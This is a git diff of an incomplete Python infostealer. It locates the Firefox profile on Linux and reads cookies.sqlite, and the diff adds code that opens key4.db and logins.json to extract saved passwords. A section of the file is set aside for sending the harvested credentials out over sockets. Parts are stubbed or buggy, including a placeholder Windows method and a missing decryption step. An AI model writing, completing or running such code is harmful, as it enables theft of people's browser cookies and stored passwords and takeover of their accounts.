@@ -1,5 +1,5 @@
 from abc import ABC, abstractmethod
-import os, socket, platform, sqlite3;
+import os, socket, platform, sqlite3, json;
 
 
 # * Classes to detect Operating System
@@ -17,7 +17,6 @@ class OSDetector(OSInterface):
 
 # * Classes to search profile directories in different browsers
 class ProfileDirectoryFinder(ABC):
-
     @abstractmethod
     def FindProfileDirectoryInLinux(self):
         pass
@@ -36,8 +35,7 @@ class FirefoxProfileFinder(ProfileDirectoryFinder):
 
 
         if ".mozilla" not in os.listdir(homeDirectory):
-            print("firefox not installed")
-            return False;
+            raise FileNotFoundError("Firefox not installed")
 
 
         for directory in os.listdir(browserDirectory):
@@ -51,26 +49,26 @@ class FirefoxProfileFinder(ProfileDirectoryFinder):
                 return browserDirectory
             
 
-        print("Profile not found!")
-        return None;
+        raise FileNotFoundError("Firefox profile directory not found")
          
-
 
 
     def FindProfileDirectoryInWindows(self):
         pass
 
-
+    
+    
+    
 
 # * Classes to obtain Browser Cookies
 class BrowserCookiesGetter(ABC):
 
     @abstractmethod
-    def GetCookiesInLinux(self, username):
+    def GetCookiesInLinux(self):
         pass
 
     @abstractmethod
-    def GetCookiesInWindows(self, username):
+    def GetCookiesInWindows(self):
         pass
 
     
@@ -84,19 +82,15 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
 
     def GetCookiesInLinux(self):
 
-        browserDirectory = ProfileDirectoryFinder.FindProfileDirectoryInLinux();
-
-        if(not browserDirectory):
-            print("Error");
-            return False;
-
-        cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite")
-        if not os.path.exists(cookiesDbPath):
-            print("Cookies database not found!")
-            return False
-
-
         try: 
+
+            browserDirectory = ProfileDirectoryFinder.FindProfileDirectoryInLinux();
+            cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite");
+
+
+            if not os.path.exists(cookiesDbPath):
+                raise FileNotFoundError("Cookies database not found!");
+
 
             connection = sqlite3.connect(browserDirectory)
             cursor = connection.cursor()
@@ -110,68 +104,155 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
             print(e)
             return False;
             
+
+
     def GetCookiesInWindows(self, username):
         pass
 
 
 
 
-
-
-
 # * Classes to get saved passwords in browsers 
+class BrowserPasswordsGetter(ABC):
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-class ChromeCookiesGetter(BrowserCredentialsGetter):
-    def __init__(self): 
+    @abstractmethod
+    def GetPasswordInLinux(self):
         pass
 
-
-    def GetCookies(self):
+    @abstractmethod
+    def GetPasswordsInWindows(self):
         pass
 
 
 
-# * Classes to send Browser Cookies with Sockets
+class FirefoxPasswordsGetter(BrowserPasswordsGetter):
+
+    def __init__(self, profileFinder: ProfileDirectoryFinder):
+        self.profileFinder = profileFinder;
+
+
+    def GetPasswordInLinux(self):
+
+
+        try:
+
+            browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
+            keyDbPath = os.path.join(browserDirectory, "key4.db");             
+            loginFilePath = os.path.join(browserDirectory, "logins.json")
+
+
+
+            if(not os.path.exists(keyDbPath) or not os.path.exists(loginFilePath)): 
+                raise FileNotFoundError("Key4.db or logins.json not exists!");
+
+
+            try:
+        
+                results = self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password';");
+
+                
+
+
+
+            except Exception as e:
+                print(e)
+
+           
+            
+            
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+
+        except Exception as e:
+
+            print(e)
+            pass
+        
+
+
+
+
+    def GetPasswordsInWindows(self):
+        
+        return "Pipe Porrero"
+
+        
+    def __ExecuteSQLQuery(self, dbPath, sqlQuery):
+
+
+        with sqlite3.connect(dbPath) as db:
+
+            cursor = db.cursor()
+            cursor.execute(sqlQuery);
+            results = cursor.fetchall()
+
+        return results;
+
+
+
+        
+        
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# * Classes to send Browser credentials with Sockets
 class SocketSender(ABC):
 
     @abstractmethod
@@ -199,16 +280,14 @@ class BrowserDataSender(SocketSender):
 
 def Main():
 
-    homeDirectory = os.path.expanduser("~");
-    cookiesDirectory = homeDirectory;
 
-    if ".mozilla" not in os.listdir(homeDirectory):
-        print("No esta")
+    finder = FirefoxProfileFinder();
 
-    cookiesDirectory = cookiesDirectory + "/.mozilla/firefox"
-    xd = os.listdir(cookiesDirectory)
-    print(xd)
-    
+
+    xd = FirefoxPasswordsGetter(finder);
+
+    xd.GetPasswordInLinux()
+
 
 
 
